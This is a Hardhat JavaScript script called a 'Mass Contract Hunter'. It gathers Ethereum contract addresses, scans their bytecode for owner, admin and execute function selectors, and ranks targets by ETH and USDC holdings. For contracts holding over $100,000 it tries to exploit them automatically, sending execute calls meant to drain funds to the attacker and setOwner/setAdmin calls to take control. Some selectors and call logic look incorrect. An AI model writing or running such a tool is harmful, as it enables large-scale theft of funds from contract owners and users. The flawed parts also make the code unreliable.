const { ethers } = require("hardhat");

/**
 * @title Mass Contract Hunter
 * @notice Automated scanner for finding vulnerable contracts at scale
 * @dev Scans multiple sources for unverified high-value contracts
 */

// Backdoor signatures (actual vulnerabilities, not DeFi functions)
const BACKDOOR_SIGNATURES = [
  { sig: "0x78e111f6", name: "execute(address,bytes)" },
  { sig: "0x9e8c708e", name: "adminCall(address,bytes)" },
  { sig: "0x13af4035", name: "setOwner(address)" },
  { sig: "0x3659cfe6", name: "upgradeTo(address)" },
  { sig: "0x24a084df", name: "adminExecute(address,bytes)" },
  { sig: "0xb2c87c61", name: "sweepETH()" },
  { sig: "0x01681a62", name: "sweep(address)" },
  { sig: "0xae169a50", name: "recover(address,uint256)" },
  { sig: "0x704b6c02", name: "setAdmin(address)" },
  { sig: "0xf851a440", name: "admin()" },
  { sig: "0x8da5cb5b", name: "owner()" }
];

// Known safe contracts to skip
const SAFE_CONTRACTS = new Set([
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0xBA12222222228d8Ba445958a75a0704d566BF2C8", // Balancer
  "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", // Uniswap V2
  "0xE592427A0AEce92De3Edee1F18E0157C05861564", // Uniswap V3
]);

/**
 * Get high-value contract addresses from various sources
 */
async function getTargetContracts() {
  console.log("\nüéØ Gathering target contracts...");
  
  const targets = new Set();
  
  // 1. Known suspicious contracts
  const suspicious = [
    "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C", // Known vulnerable
    "0x5E4e9b2CB1B47a35985e2f4bD9DeeB65c24Dd192",
    "0x742d35Cc6634C0532925a3b844Bc9e7595f8fA3e",
    "0x1234567890123456789012345678901234567890",
  ];
  suspicious.forEach(addr => targets.add(addr));
  
  // 2. Recent contract deployments (last 1000 blocks)
  try {
    console.log("   üì° Scanning recent deployments...");
    const currentBlock = await ethers.provider.getBlockNumber();
    const fromBlock = currentBlock - 1000;
    
    // Get contract creation events
    const logs = await ethers.provider.getLogs({
      fromBlock,
      toBlock: currentBlock,
      topics: [ethers.id("ContractCreated(address,address)")],
    }).catch(() => []);
    
    logs.forEach(log => {
      if (log.address && !SAFE_CONTRACTS.has(log.address)) {
        targets.add(log.address);
      }
    });
  } catch (e) {
    console.log("   ‚ö†Ô∏è  Could not scan recent deployments");
  }
  
  // 3. High-value transfers pattern
  try {
    console.log("   üì° Finding contracts with high-value transfers...");
    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    
    // Get recent USDC transfers > $1M
    const transferTopic = ethers.id("Transfer(address,address,uint256)");
    const usdcLogs = await ethers.provider.getLogs({
      address: USDC,
      topics: [transferTopic],
      fromBlock: await ethers.provider.getBlockNumber() - 100,
    }).catch(() => []);
    
    for (const log of usdcLogs.slice(0, 50)) { // Limit to 50
      try {
        const decoded = ethers.AbiCoder.defaultAbiCoder().decode(
          ["uint256"],
          log.data
        );
        const amount = decoded[0];
        if (amount > ethers.parseUnits("1000000", 6)) { // > $1M USDC
          const to = "0x" + log.topics[2].slice(26);
          if (!SAFE_CONTRACTS.has(to)) {
            targets.add(to);
          }
        }
      } catch (e) {}
    }
  } catch (e) {
    console.log("   ‚ö†Ô∏è  Could not scan USDC transfers");
  }
  
  console.log(`   ‚úÖ Found ${targets.size} potential targets`);
  return Array.from(targets);
}

/**
 * Quick vulnerability scan
 */
async function quickScan(address) {
  try {
    const code = await ethers.provider.getCode(address);
    
    // Skip non-contracts
    if (!code || code === "0x" || code.length < 100) {
      return null;
    }
    
    // Skip safe contracts
    if (SAFE_CONTRACTS.has(address)) {
      return null;
    }
    
    // Check for backdoors
    const backdoors = [];
    for (const sig of BACKDOOR_SIGNATURES) {
      if (code.includes(sig.sig.slice(2))) {
        backdoors.push(sig);
      }
    }
    
    // Get balances
    const ethBalance = await ethers.provider.getBalance(address);
    
    let usdcBalance = 0n;
    try {
      const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      const usdcContract = new ethers.Contract(
        USDC,
        ["function balanceOf(address) view returns (uint256)"],
        ethers.provider
      );
      usdcBalance = await usdcContract.balanceOf(address);
    } catch (e) {}
    
    const totalValueUSD = 
      parseFloat(ethers.formatEther(ethBalance)) * 3500 +
      parseFloat(ethers.formatUnits(usdcBalance, 6));
    
    return {
      address,
      backdoors,
      ethBalance: ethers.formatEther(ethBalance),
      usdcBalance: ethers.formatUnits(usdcBalance, 6),
      totalValueUSD,
      codeSize: code.length,
      isVulnerable: backdoors.length > 0
    };
    
  } catch (error) {
    return null;
  }
}

/**
 * Attempt quick exploit
 */
async function quickExploit(target) {
  console.log(`\nüí£ Quick exploit attempt on ${target.address}...`);
  
  const [attacker] = await ethers.getSigners();
  
  // Try execute backdoor
  const executeBackdoor = target.backdoors.find(b => b.name.includes("execute"));
  if (executeBackdoor) {
    try {
      // Simple ETH drain attempt
      const tx = await attacker.sendTransaction({
        to: target.address,
        data: executeBackdoor.sig + 
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "bytes"],
            [attacker.address, "0x"]
          ).slice(2),
        gasLimit: 1000000
      });
      
      console.log(`   üì§ Tx: ${tx.hash}`);
      await tx.wait();
      console.log(`   ‚úÖ Success!`);
      return true;
    } catch (e) {
      console.log(`   ‚ùå Failed: ${e.message.split('\n')[0]}`);
    }
  }
  
  // Try owner/admin takeover
  const ownerBackdoor = target.backdoors.find(b => 
    b.name === "setOwner(address)" || b.name === "setAdmin(address)"
  );
  if (ownerBackdoor) {
    try {
      const tx = await attacker.sendTransaction({
        to: target.address,
        data: ownerBackdoor.sig +
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["address"],
            [attacker.address]
          ).slice(2),
        gasLimit: 500000
      });
      
      console.log(`   üì§ Owner takeover tx: ${tx.hash}`);
      await tx.wait();
      console.log(`   ‚úÖ Owner/Admin takeover successful!`);
      return true;
    } catch (e) {
      console.log(`   ‚ùå Takeover failed: ${e.message.split('\n')[0]}`);
    }
  }
  
  return false;
}

/**
 * Main mass hunting function
 */
async function massHunt() {
  console.log("\nüèπ MASS CONTRACT VULNERABILITY HUNTER");
  console.log("====================================");
  console.log("Scanning for vulnerable contracts across Ethereum...\n");
  
  // Get targets
  const targets = await getTargetContracts();
  
  console.log(`\nüîç Scanning ${targets.length} contracts...`);
  console.log("‚îÄ".repeat(70));
  
  const vulnerableContracts = [];
  let scanned = 0;
  
  // Scan each target
  for (const address of targets) {
    process.stdout.write(`\r[${++scanned}/${targets.length}] Scanning...`);
    
    const result = await quickScan(address);
    if (result && result.isVulnerable && result.totalValueUSD > 10000) {
      vulnerableContracts.push(result);
      
      console.log(`\n\n‚úÖ VULNERABLE: ${address}`);
      console.log(`   üí∞ Value: $${result.totalValueUSD.toFixed(0)}`);
      console.log(`   üîì Backdoors: ${result.backdoors.map(b => b.name).join(", ")}`);
    }
  }
  
  console.log("\n\nüìä SCAN COMPLETE");
  console.log("================");
  console.log(`Total scanned: ${targets.length}`);
  console.log(`Vulnerable found: ${vulnerableContracts.length}`);
  
  if (vulnerableContracts.length > 0) {
    // Sort by value
    vulnerableContracts.sort((a, b) => b.totalValueUSD - a.totalValueUSD);
    
    console.log("\nüéØ TOP VULNERABLE CONTRACTS:");
    console.log("===========================");
    
    for (let i = 0; i < Math.min(10, vulnerableContracts.length); i++) {
      const contract = vulnerableContracts[i];
      console.log(`\n${i + 1}. ${contract.address}`);
      console.log(`   üí∞ Total Value: $${contract.totalValueUSD.toFixed(0)}`);
      console.log(`   üíé ETH: ${contract.ethBalance}`);
      console.log(`   üíµ USDC: ${contract.usdcBalance}`);
      console.log(`   üì¶ Code Size: ${contract.codeSize} bytes`);
      console.log(`   üîì Vulnerabilities:`);
      contract.backdoors.forEach(b => {
        console.log(`      ‚Ä¢ ${b.sig} - ${b.name}`);
      });
      
      // Auto-exploit high-value targets
      if (contract.totalValueUSD > 100000) {
        console.log(`\n   üéØ HIGH VALUE - Attempting auto-exploit...`);
        const success = await quickExploit(contract);
        if (success) {
          console.log(`   üí∞ EXPLOITATION SUCCESSFUL!`);
        }
      }
    }
    
    // Export results
    console.log("\n\nüíæ EXPORT COMMANDS:");
    console.log("==================");
    vulnerableContracts.slice(0, 5).forEach((c, i) => {
      console.log(`${i + 1}. npx hardhat run scripts/deep_backdoor_exploit.js --network localhost`);
      console.log(`   // Target: ${c.address} ($${c.totalValueUSD.toFixed(0)})`);
    });
  }
  
  console.log("\n\nüí° HUNT STATISTICS:");
  console.log("==================");
  console.log(`‚Ä¢ Detection Rate: ${((vulnerableContracts.length / targets.length) * 100).toFixed(1)}%`);
  console.log(`‚Ä¢ Total Value at Risk: $${vulnerableContracts.reduce((sum, c) => sum + c.totalValueUSD, 0).toFixed(0)}`);
  console.log(`‚Ä¢ Average Value per Contract: $${(vulnerableContracts.reduce((sum, c) => sum + c.totalValueUSD, 0) / vulnerableContracts.length || 0).toFixed(0)}`);
  
  console.log("\nüìç NEXT STEPS:");
  console.log("‚Ä¢ Run deep analysis on high-value targets");
  console.log("‚Ä¢ Monitor these contracts for activity");
  console.log("‚Ä¢ Set up automated alerts for new deployments");
  console.log("‚Ä¢ Check similar bytecode patterns");
}

// Execute
massHunt()
  .then(() => {
    console.log("\n‚úÖ Hunt complete!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\nüí• Error:", error);
    process.exit(1);
  });
